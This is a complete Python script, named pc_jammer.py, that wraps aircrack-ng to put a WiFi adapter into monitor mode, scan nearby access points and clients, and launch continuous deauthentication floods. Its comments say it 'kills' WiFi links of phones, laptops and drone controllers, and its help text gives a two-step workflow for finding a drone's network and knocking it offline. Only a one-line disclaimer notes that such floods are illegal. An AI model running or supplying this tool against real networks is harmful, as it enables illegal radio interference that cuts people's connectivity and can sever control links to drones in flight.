#!/usr/bin/env python3
# language: Python 3.8+, file: pc_jammer.py, target: Linux
# WiFi deauthentication tool — runs on YOUR PC via a monitor-mode WiFi adapter.
# Kills WiFi client links (drone control, phones, laptops) by forging deauth frames.
# Deps: aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng) + monitor-capable NIC.
# Most internal laptop cards CANNOT inject — use a USB adapter (Alfa AWUS036ACM/ACH,
# TP-Link Archer T2U/T4U, etc.). Run with sudo.
# Legal: deauth floods are illegal interference in most jurisdictions —
# use only against networks/devices you own.

import argparse
import csv
import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time


def need(exe):
    if not shutil.which(exe):
        sys.exit(f"[!] {exe} not found — install aircrack-ng: sudo apt install aircrack-ng")


def euid_check():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("[!] not root — monitor mode & injection need sudo. re-run: sudo python3 pc_jammer.py ...")
        sys.exit(1)


def find_interfaces():
    """Parse `iw dev` -> {iface: {'mac':..,'type':..,'phy':..}}"""
    try:
        out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
    except (FileNotFoundError, subprocess.CalledProcessError):
        return {}
    ifaces = {}
    cur = None
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\S+)", line)
        if m:
            cur = m.group(1)
            ifaces[cur] = {}
            continue
        if cur:
            for key, pat in (("mac", r"addr\s+(\S+)"), ("type", r"type\s+(\S+)"),
                             ("phy", r"wiphy\s+(\S+)")):
                mm = re.search(pat, line)
                if mm:
                    ifaces[cur][key] = mm.group(1)
    return ifaces


def pick_interface(preferred=None):
    ifaces = find_interfaces()
    if not ifaces:
        sys.exit("[!] no wireless interfaces found (iw dev empty).")
    if preferred:
        if preferred not in ifaces:
            sys.exit(f"[!] interface {preferred} not found. available: {', '.join(ifaces)}")
        return preferred
    # prefer an existing monitor iface, else first managed wlan*
    for name, info in ifaces.items():
        if info.get("type") == "monitor":
            return name
    managed = [n for n in ifaces if n.startswith(("wlan", "wlx"))]
    return managed[0] if managed else sorted(ifaces)[0]


def ensure_monitor(iface):
    """Return monitor-mode interface name. Uses airmon-ng; falls back to iw."""
    info = find_interfaces().get(iface, {})
    if info.get("type") == "monitor":
        return iface

    need("airmon-ng")
    # kill processes that hijack the card (NetworkManager etc.)
    subprocess.run(["airmon-ng", "check", "kill"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    out = subprocess.run(["airmon-ng", "start", iface],
                         capture_output=True, text=True).stdout
    m = re.search(r"monitor mode enabled on\s+(\S+)", out)
    if m:
        return m.group(1)
    # some drivers rename differently — look for new *mon iface
    time.sleep(1)
    for name, i2 in find_interfaces().items():
        if i2.get("type") == "monitor":
            return name
    sys.exit(f"[!] could not enable monitor mode on {iface}.\n"
             f"    airmon-ng output said: {out.strip()[-300:]}")


def scan(iface, seconds, bssid_filter=None):
    """Run airodump-ng, parse CSVs, print APs + associated stations."""
    need("airodump-ng")
    prefix = tempfile.mktemp(prefix="scan_")
    proc = subprocess.Popen(
        ["airodump-ng", iface, "-w", prefix, "--output-format", "csv"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[*] scanning {seconds}s on {iface} — Ctrl+C to stop early")
    try:
        proc.wait(timeout=seconds)
    except subprocess.TimeoutExpired:
        proc.send_signal(signal.SIGINT)
        proc.wait()

    aps, stations = {}, {}
    for suffix, dest in (("-01.csv", aps), ("-02.csv", stations)):
        path = prefix + suffix
        if not os.path.exists(path):
            continue
        with open(path, newline="", errors="replace") as f:
            rows = [r for r in csv.reader(f) if r]
        # find header row containing 'BSSID'
        hdr_idx = next((i for i, r in enumerate(rows)
                        if r and r[0].strip() == "BSSID"), None)
        if hdr_idx is None:
            continue
        header = [h.strip() for h in rows[hdr_idx]]
        for r in rows[hdr_idx + 1:]:
            if len(r) < len(header):
                r += [""] * (len(header) - len(r))
            rec = dict(zip(header, [c.strip() for c in r]))
            key = rec.get("BSSID") or rec.get("Station MAC") or ""
            if key and "BSSID" not in key.upper():  # skip blank/section rows
                dest[key] = rec
    for p in (prefix + "-01.csv", prefix + "-02.csv"):
        try:
            os.unlink(p)
        except OSError:
            pass

    print(f"\n{'BSSID':<18} {'CH':>3} {'PWR':>4}  {'ESSID'}")
    print("-" * 70)
    for bssid, a in sorted(aps.items(), key=lambda kv: -int(kv[1].get("Power", "-100") or -100)):
        print(f"{bssid:<18} {a.get('Channel','?'):>3} {a.get('Power','?'):>4}  "
              f"{a.get('ESSID','')[:40]}")
    if stations:
        print("\nclients:")
        for mac, s in stations.items():
            print(f"  {mac:<18} -> AP {s.get('BSSID','?'):18} "
                  f"pwr={s.get('Power','?')}")
    if not aps:
        print("[!] no APs seen — wrong interface? needs monitor mode + antenna.")


def attack(iface, bssid, client=None, count=0, ignore_negative=False):
    """aireplay-ng deauth flood. count=0 means continuous until Ctrl+C."""
    need("aireplay-ng")
    cmd = ["aireplay-ng"]
    if ignore_negative:
        cmd.append("--ignore-negative")
    cmd += ["-0", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(iface)
    print(f"[*] deauth -> BSSID {bssid}" + (f" client {client}" if client else " (all clients)"))
    print(f"[*] iface {iface}  count={'∞' if count == 0 else count}  Ctrl+C to stop")
    proc = subprocess.Popen(cmd)
    try:
        proc.wait()
    except KeyboardInterrupt:
        proc.send_signal(signal.SIGINT)
        proc.wait()
    print("[*] stopped")


def main():
    p = argparse.ArgumentParser(
        description="WiFi deauth tool — monitor-mode adapter + aircrack-ng",
        epilog="workflow:\n"
               "  1. sudo python3 pc_jammer.py scan -i wlan0        # find drone AP BSSID\n"
               "  2. sudo python3 pc_jammer.py attack -b AA:BB:..  # deauth it\n"
               "  add -c <client-mac> to target one device only\n"
               "  add --iface wlan0mon if airmon-ng already made a monitor iface",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("scan", help="list nearby APs and clients")
    s.add_argument("-i", "--iface", default=None)
    s.add_argument("-t", "--time", type=int, default=20, help="scan seconds")

    a = sub.add_parser("attack", help="deauth flood against a BSSID")
    a.add_argument("-b", "--bssid", required=True, help="target AP BSSID")
    a.add_argument("-c", "--client", default=None, help="single client MAC (optional)")
    a.add_argument("-n", "--count", type=int, default=0,
                   help="deauth packets per burst, 0=continuous (default 0)")
    a.add_argument("-i", "--iface", default=None)
    a.add_argument("--ignore-negative", action="store_true")

    args = p.parse_args()
    euid_check()
    iface = pick_interface(getattr(args, "iface", None))
    mon = ensure_monitor(iface)

    if args.cmd == "scan":
        scan(mon, args.time)
    elif args.cmd == "attack":
        attack(mon, args.bssid, args.client, args.count, args.ignore_negative)


if __name__ == "__main__":
    main()
